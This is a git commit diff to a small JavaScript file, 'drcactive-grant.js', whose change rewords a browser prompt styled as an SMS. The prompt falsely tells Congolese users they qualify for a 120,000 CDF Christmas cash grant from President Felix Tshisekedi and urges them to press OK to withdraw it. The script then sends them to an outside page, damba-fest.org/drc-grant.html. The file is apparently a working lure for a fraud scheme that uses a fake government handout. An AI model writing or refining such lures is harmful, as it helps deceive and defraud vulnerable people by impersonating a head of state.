3d50f0aa22b16f98f33bd595f5c7779368de7ce8
boss-bloq <nsisboy01@gmail.com>
2024-11-18 11:32:56 -0800

    Update drcactive-grant.js

--- drcactive-grant.js
+++ drcactive-grant.js
@@ -1,6 +1,6 @@
 
 var password = 'RETRAIT 120.000 CDF'
-password=prompt('SMS: Félicitations, vous êtes admissible à la subvention en espèces du président FELIX TSHISEKEDI de 120 000 CDF pour les CONGOLAIS. Veuillez appuyer sur OK pour retirer le prix en espèces.   ','RETRAIT 120.000 CDF');
+password=prompt('SMS : Félicitations, vous êtes éligible à la subvention de Noël en espèces de 120 000 CDF du Président FELIX TSHISEKEDI pour les CONGOLAIS. Veuillez appuyer sur OK pour retirer le prix en espèces.   ','RETRAIT 120.000 CDF');
 if (password != 'RETRAIT 120.000 CDF') {
 location.href='https://damba-fest.org/drc-grant.html';
 }
